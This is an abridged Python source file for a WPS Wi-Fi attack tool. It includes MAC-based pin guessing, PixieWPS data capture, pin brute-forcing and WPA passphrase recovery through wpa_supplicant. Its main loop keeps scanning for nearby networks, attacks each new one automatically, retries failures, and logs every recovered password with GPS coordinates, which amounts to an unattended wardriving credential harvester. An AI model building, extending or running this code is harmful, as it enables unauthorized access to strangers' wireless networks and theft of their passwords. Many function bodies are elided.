...
class NetworkAddress:
    """Representation of a MAC address with string and integer conversion methods."""

    def __init__(self, mac):
        """Initialize NetworkAddress with either string or integer MAC representation."""
...
class WPSpin:
    ...
    def getList(self, mac, get_static=True):
        """Get all WPS pins for single MAC as list"""
        res = []
        for ID, algo in self.algos.items():
            if algo["mode"] == self.ALGO_STATIC and not get_static:
                continue
    ...
    def getSuggested(self, mac):
        """Get all suggested WPS pins for single MAC"""
    ...
    def getSuggestedList(self, mac):
        """Get all suggested WPS pins for single MAC as list"""
        algos = self._suggest(mac)
        res = []
        for algo in algos:
    ...
    def getLikely(self, mac):
        """Get the most likely WPS pin for single MAC"""
    ...
    def _suggest(self, mac):
        """
        Get algo suggestions for single MAC
        Returns the algo ID
        """
...
def recvuntil(pipe, what):
    """Read from pipe until specified string is found."""
    s = ""
    while True:
...
def get_hex(line):
    """Extract and format hex value from a line of output."""
    a = line.split(":", 3)
    return a[2].replace(" ", "").upper()


class PixiewpsData:
    """Storage for data required by PixieWPS attack."""

    def __init__(self):
        """Initialize empty PixieWPS data fields."""
        self.pke = ""
        self.pkr = ""
        self.e_hash1 = ""
        self.e_hash2 = ""
    ...
    def clear(self):
        """Reset all PixieWPS data fields."""
        self.__init__()

    def got_all(self):
        """Check if all required fields for PixieWPS are present."""
        return (
            self.pke
            and self.pkr
            and self.e_nonce
    ...
    def get_pixie_cmd(self, full_range=False):
        """Generate the pixiewps command string using collected data."""
        pixiecmd = (
...
class ConnectionStatus:
    """Tracks the status of a WPS connection attempt."""

    def __init__(self):
        """Initialize connection status with empty values."""
        self.status = ""
    ...
    def isFirstHalfValid(self):
        """Check if the first half of the WPS pin is valid based on message exchange."""
...
class BruteforceStatus:
    """Tracks the progress of a WPS pin brute-force attack."""

    def __init__(self):
        """Initialize brute-force status."""
    ...
    def display_status(self):
        """Calculate and display current brute-force progress and speed."""
...
class Companion:
    ...
    def __init__(
        ...
        """Initialize Companion instance with network interface and settings."""
    ...
    def __init_wpa_supplicant(self):
        ...
        while True:
            ...
            if ret is not None and ret != 0:
                raise ValueError(
                    "wpa_supplicant returned an error: " + self.wpas.communicate()[0]
                )
    ...
    def __saveResult(
        self, bssid, essid, wps_pin, wpa_psk, latitude=None, longitude=None
    ):
        # Only save if we have valid credentials
        if not wpa_psk:
            print("[!] No WPA PSK to save, skipping save.")
            return
    ...
    def single_connection(
        ...
        if self.connection_status.status == "GOT_PSK":
            ...
            if self.save_result:
                ...
                # Pass the actual values from connection_status
                self.__saveResult(
                    bssid,
                    self.connection_status.essid,
                    pin,
...
class WiFiScanner:
    ...
    def __init__(self, interface, vuln_list=None, stored_networks=None):
        ...
        # FIX: Store only BSSIDs for comparison, not (BSSID, ESSID) tuples
        self.stored_bssids = set()

        if stored_networks is not None:
            # stored_networks is already a set of BSSIDs
            self.stored_bssids = stored_networks
        else:
            reports_fname = (
            ...
            try:
                with open(
                    ...
                    for row in csvReader:
                        self.stored_bssids.add(row[1])  # Add BSSID only
            except FileNotFoundError:
                pass
    ...
    def iw_scanner(self) -> Dict[int, dict]:
        ...
        for n, network in network_list_items:
            ...
            # FIX: Compare only BSSID, not (BSSID, ESSID) tuple
            if network["BSSID"] in self.stored_bssids:
    ...
    while True:
        try:
            ...
            for _, network in networks.items():
                bssid = network["BSSID"]
                model = network.get("model_string", "")
            ...
            if not prioritized_targets:
                print(
                    "[i] No new networks to attack. Waiting for new networks to appear..."
                )
                time.sleep(5)
                continue
            ...
            # FIX: Create a new Companion instance for each target to avoid state pollution
            ...
            companion = Companion(
                ...
                attempt_timeout=args.attempt_time,
            )
            ...
            try:
                if companion.single_connection(
                    ...
                    print(
                        f"[+] Successfully attacked {target['essid']}. Credentials saved."
                    )
                    ...
                    if target["bssid"] in failed_networks:
                        ...
                        failed_networks[target["bssid"]] = (
                            current_time,
                            retry_count + 1,
                        )
                        print(
                            f"[i] Retry count for {target['bssid']}: {retry_count + 1}/{MAX_RETRIES}"
                        )
                    else:
                        failed_networks[target["bssid"]] = (current_time, 1)
                        print(
                            f"[i] Added to failed list. Will retry after {FAIL_COOLDOWN}s cooldown."
                        )
...
def get_gps_location():
    """Retrieves the most recent GPS coordinates gathered by the
    background location thread. Returns `(latitude, longitude)` or
    `(None, None)` if no recent data is available.
    """
    with location_lock:
    ...
    if time.time() - ts > 60:
        print(
            "[!] Stale location data (older than 60s). You may need to wait for a new GPS lock."
        )
        return None, None
...
if __name__ == "__main__":
    ...
    if args.location:
        if not shutil.which("termux-location"):
            die(
                "ERROR: --location requires 'termux-api'. Please run: pkg install termux-api"
            )
        else:
            print_termux_location_guide()
            print("[*] Starting background GPS polling...")
            location_thread = threading.Thread(
                target=location_updater_thread, daemon=True
            )
